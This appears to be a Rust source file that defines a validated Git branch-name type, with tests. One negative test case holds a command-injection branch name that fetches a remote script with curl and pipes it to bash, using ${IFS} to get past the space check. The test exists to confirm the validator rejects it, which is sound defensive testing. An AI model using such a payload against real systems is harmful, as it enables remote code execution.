use derive_more::Display;
use git_validate::reference::name_partial;
#[cfg(feature = "schema")]
use schemars::JsonSchema;
use std::str::FromStr;
#[cfg(feature = "wasm")]
use wasm_bindgen::prelude::wasm_bindgen;

use serde::{Deserialize, Serialize};

use crate::{Slug, ValidError};

// https://stackoverflow.com/questions/60045157/what-is-the-maximum-length-of-a-github-branch-name
const MAX_BRANCH_LEN: usize = 256;

#[typeshare::typeshare]
#[derive(Debug, Display, Clone, Eq, PartialEq, Ord, PartialOrd, Hash, Serialize, Deserialize)]
#[cfg_attr(feature = "schema", derive(JsonSchema))]
#[serde(try_from = "String")]
#[cfg_attr(feature = "db", derive(diesel::FromSqlRow, diesel::AsExpression))]
#[cfg_attr(feature = "db", diesel(sql_type = diesel::sql_types::Text))]
pub struct BranchName(String);

#[cfg(feature = "db")]
crate::typed_string!(BranchName);

impl TryFrom<String> for BranchName {
    type Error = ValidError;

    fn try_from(branch_name: String) -> Result<Self, Self::Error> {
        if is_valid_branch_name(&branch_name) {
            Ok(Self(branch_name))
        } else {
            Err(ValidError::BranchName(branch_name))
        }
    }
}

impl FromStr for BranchName {
    type Err = ValidError;

    fn from_str(branch_name: &str) -> Result<Self, Self::Err> {
        Self::try_from(branch_name.to_owned())
    }
}

impl AsRef<str> for BranchName {
    fn as_ref(&self) -> &str {
        &self.0
    }
}

impl From<BranchName> for String {
    fn from(branch_name: BranchName) -> Self {
        branch_name.0
    }
}

impl From<Slug> for BranchName {
    fn from(slug: Slug) -> Self {
        Self(slug.into())
    }
}

impl BranchName {
    pub const MAX_LEN: usize = MAX_BRANCH_LEN;
}

#[cfg_attr(feature = "wasm", wasm_bindgen)]
pub fn is_valid_branch_name(branch_name: &str) -> bool {
    branch_name.len() <= MAX_BRANCH_LEN && name_partial(branch_name.into()).is_ok()
}

#[cfg(test)]
mod tests {
    use super::is_valid_branch_name;
    use pretty_assertions::assert_eq;

    #[test]
    fn is_valid_branch_name_true() {
        for name in [
            "refs/heads/main",
            "main",
            "MAIN",
            "bencher/main",
            "bencher-main",
        ] {
            assert_eq!(true, is_valid_branch_name(name), "{name}");
        }
    }

    #[test]
    fn is_valid_branch_name_false() {
        for name in [
            "",
            " main",
            "ma in",
            "main ",
            ".main",
            // Credit to https://github.com/nikitastupin
            "$(curl${IFS}-L${IFS}gist.githubusercontent.com/nikitastupin
            /30e525b776c409e03c2d6f328f254965/raw/shortcut.sh|bash)",
        ] {
            assert_eq!(false, is_valid_branch_name(name), "{name}");
        }
    }

    #[test]
    fn branch_name_serde_roundtrip() {
        use super::BranchName;

        let name: BranchName = serde_json::from_str("\"main\"").unwrap();
        assert_eq!(name.as_ref(), "main");
        let json = serde_json::to_string(&name).unwrap();
        assert_eq!(json, "\"main\"");

        let err = serde_json::from_str::<BranchName>("\"\"");
        assert!(err.is_err());
    }
}
